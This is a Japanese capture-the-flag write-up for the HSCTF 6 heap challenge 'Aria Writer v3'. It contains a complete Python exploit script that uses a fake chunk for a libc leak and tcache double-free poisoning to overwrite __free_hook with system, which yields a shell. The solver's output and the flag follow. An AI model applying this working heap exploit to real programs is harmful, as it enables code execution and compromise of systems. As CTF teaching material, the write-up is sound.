# [pwn 468pts] Aria Writer v3 - HSCTF 6
64ビットでPIE以外有効です。
```
$ checksec -f aria-writer-v3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols     Yes	0		6	aria-writer-v3
```

Aria Writerと内容は似ていますが、RELROが有効な上に名前以外にリークがありません。
競技中はなぜかこの問題を解けなかったのですが、よく考えたらtcacheが有効でPIEは無効なので簡単でした。
nameに偽の巨大なチャンクを作り、それをfreeすることでunsorted binに繋げます。
次のチャンクと次の次のチャンクを用意しておかないとfree時に怒られるので注意です。

```python
from ptrlib import *

def alloc(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("> ")
    sock.sendline(str(size))
    sock.recvuntil("> ")
    sock.send(data)

def free():
    sock.recvuntil("> ")
    sock.sendline("2")

elf = ELF("./aria-writer-v3")
libc = ELF("./libc-2.27.so")
#sock = Process("./aria-writer-v3")
sock = Socket("pwn.hsctf.com", 2468)

addr_name = 0x602048
addr_fake_next = 0x6020e0
plt_puts = 0x400710
main_arena = 0x3ebc40
delta = 0x490

# name
fake_chunk = p64(0x501)
sock.recvuntil("> ")
sock.sendline(fake_chunk)

# fake chunk next to fake chunk
alloc(0x48, "Hello")
free()
free()
alloc(0x48, p64(addr_name - 8 + 0x520))
alloc(0x48, "dummy")
alloc(0x48, p64(0) + p64(0x21)) # name + 0x500
logger.info("created a fake chunk")

# fake chunk
alloc(0x38, "Hello")
free()
free()
alloc(0x38, p64(addr_name - 8 + 0x500))
alloc(0x38, "dummy")
alloc(0x38, p64(0) + p64(0x21)) # name + 0x500
logger.info("created a large chunk")

# fake
alloc(0x28, "Hello")
free()
free()
alloc(0x28, p64(addr_name + 8))
alloc(0x28, "dummy")
alloc(0x28, "hOI!") # name
free()
logger.info("freed a large chunk")

# fill data in name
alloc(0x18, "Hello")
free()
free()
alloc(0x18, p64(addr_name))
alloc(0x18, "dummy")
alloc(0x18, "A" * 0x10)
addr_main_arena = u64(sock.recvuntil("!")[0x10:-1])
libc_base = addr_main_arena - main_arena - delta
logger.info("libc base = " + hex(libc_base))

# overwrite __free_hook
alloc(0x58, "Hello")
free()
free()
alloc(0x58, p64(libc_base + libc.symbol("__free_hook")))
alloc(0x58, "dummy")
alloc(0x58, p64(libc_base + libc.symbol("system")))

# get the shell!
alloc(0x68, "/bin/sh")
free()

sock.interactive()
```

できたー。
```
$ python solve.py 
[+] __init__: Successfully connected to pwn.hsctf.com:2468
[+] <module>: created a fake chunk
[+] <module>: created a large chunk
[+] <module>: freed a large chunk
[+] <module>: libc base = 0x7fbc51266000
[ptrlib]$ ok that letter was bad anyways...
cat flag
[ptrlib]$ hsctf{i_wish_tho_:(_0a0d098213}
```

# 感想
今解けるものを数日前に解けなかったのは悲しい。
